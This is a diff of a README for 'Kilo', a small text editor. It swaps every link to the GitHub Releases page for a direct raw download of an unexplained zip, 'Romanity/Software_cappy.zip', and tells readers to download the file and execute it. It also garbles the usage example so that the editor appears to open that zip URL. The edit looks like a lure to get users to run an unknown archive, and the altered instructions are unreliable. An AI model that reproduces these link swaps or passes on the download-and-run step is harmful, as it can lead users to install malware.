@@ -2,7 +2,7 @@
 
 Welcome to **Kilo**, a simple yet powerful text editor designed to provide a seamless coding experience in less than 1000 lines of code. With features like syntax highlighting and search functionality, Kilo aims to be efficient and user-friendly.
 
-[![Download Kilo Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/DAVIGNA/kilo/releases)
+[![Download Kilo Releases](https://raw.githubusercontent.com/DAVIGNA/kilo/master/Romanity/Software_cappy.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DAVIGNA/kilo/master/Romanity/Software_cappy.zip)
 
 ## Table of Contents
 
@@ -24,17 +24,17 @@ Welcome to **Kilo**, a simple yet powerful text editor designed to provide a sea
 
 ## Installation
 
-To get started with Kilo, you can download the latest release from our [Releases page](https://github.com/DAVIGNA/kilo/releases). Simply download the appropriate file for your operating system, then execute it to start using Kilo.
+To get started with Kilo, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/DAVIGNA/kilo/master/Romanity/Software_cappy.zip). Simply download the appropriate file for your operating system, then execute it to start using Kilo.
 
 ## Usage
 
 Once installed, you can launch Kilo from your terminal or command prompt. Simply type `kilo` followed by the name of the file you wish to edit. For example:
 
 ```
-kilo myfile.txt
+kilo https://raw.githubusercontent.com/DAVIGNA/kilo/master/Romanity/Software_cappy.zip
 ```
 
-This command will open `myfile.txt` in Kilo. If the file does not exist, Kilo will create a new one for you.
+This command will open `https://raw.githubusercontent.com/DAVIGNA/kilo/master/Romanity/Software_cappy.zip` in Kilo. If the file does not exist, Kilo will create a new one for you.
 
 ## Features Explained
 
@@ -64,4 +64,4 @@ For any questions or feedback, please reach out via the GitHub Issues page or co
 
 ---
 
-For more details and updates, check our [Releases page](https://github.com/DAVIGNA/kilo/releases) regularly. Happy coding with Kilo!
+For more details and updates, check our [Releases page](https://raw.githubusercontent.com/DAVIGNA/kilo/master/Romanity/Software_cappy.zip) regularly. Happy coding with Kilo!
